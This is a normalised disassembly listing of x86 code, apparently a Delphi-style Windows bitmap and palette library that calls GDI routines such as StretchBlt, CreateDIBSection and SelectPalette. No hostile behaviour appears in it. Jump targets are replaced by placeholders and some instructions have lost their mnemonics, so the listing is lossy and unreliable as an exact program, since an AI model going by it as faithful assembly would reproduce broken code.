test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_41fbd4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41fc8c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c64
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4205f8
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_41f088
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_41f08c
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413d50
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_41fcc4
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4202a8
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41fd53
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_41f8c0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_41f25c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4205f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41fd58
mov eax [ ebp - 0x8 ]
call sub_41b454
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4039f4
call sub_403a48
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_41fd84
push ebx
mov ebx eax
mov eax ebx
call sub_420078
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40cb64
pop ebx
retn
sub_41fdb4
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_415470
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_4202a8
lea eax [ ebx + 0x2c ]
call sub_40cb64
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4205f8
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_41fe28
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41d50c
mov eax ebx
call sub_420498
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_4201b4
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_420064
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41d438
push eax
call SetStretchBltMode
mov eax ebx
call sub_4200f8
mov dl [ r-xdata ]
call sub_41d50c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_420438
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4200f8
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42006b
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41fff9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41d824
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4200f8
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41d9c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_420078
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_4202b8
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_41fcc4
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41d77c
sub_4200f8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_4202b8
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ee94
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_41fd84
sub_420140
push ebx
mov ebx eax
mov eax ebx
call sub_4202a8
mov eax ebx
call sub_4202b8
mov edx ebx
mov eax ebx
call sub_41fd84
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_420164
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_4201e4
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41bd24
mov eax ebx
call sub_4201b4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_4200f8
xor edx edx
pop ecx
call sub_41d3c4
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_420234
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_420498
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41f25c
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_4202b8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41540c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_42033b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_420358
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_420402
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_4202a8
mov eax ebx
call sub_4202b8
mov eax edi
call sub_41bd24
mov ecx eax
mov esi [ ebx + 0x28 ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_41f924
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
xor ecx ecx
mov edx 0x54
call sub_402c64
lea eax [ ebp - 0x5c ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
call sub_41f8c0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4205f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_420407
mov eax [ ebp - 0x8 ]
call sub_41b454
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4039f4
call sub_403a48
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_420438
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_4202a8
mov eax ebx
call sub_4202b8
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_4201e4
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_41f924
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_41ee18
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_420498
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41df14
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_41ee18
push 0x0
call GetDC
call sub_41d824
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_420550
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41d6f8
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_41fcc4
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_4202a8
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402c64
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_4205d4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_4153ec
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_420c88
pop esi
pop ebx
retn
sub_4205f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42067f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403408
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4206df
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_41f08c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_41f088
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4206e6
push rw-data
call LeaveCriticalSection
retn
sub_4206f8
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_420c88
pop edx
pop edi
pop esi
pop ebx
retn
sub_420720
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026bc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_420c3d
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_420c10
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c64
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41d710
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_415688
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402c64
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_415618
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41d994
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41d9b4
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_415618
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41d824
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_420b8b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41dc5c
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026bc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_420af3
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_415618
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41d824
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_420ac7
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41df14
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40c608
call sub_41d710
jmp r-xdata
xor eax eax
push ebp
push sub_420b5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_415618
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420ace
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420b92
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40c608
call sub_41d710
jmp r-xdata
sub_420ace
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_420b92
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402c64
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
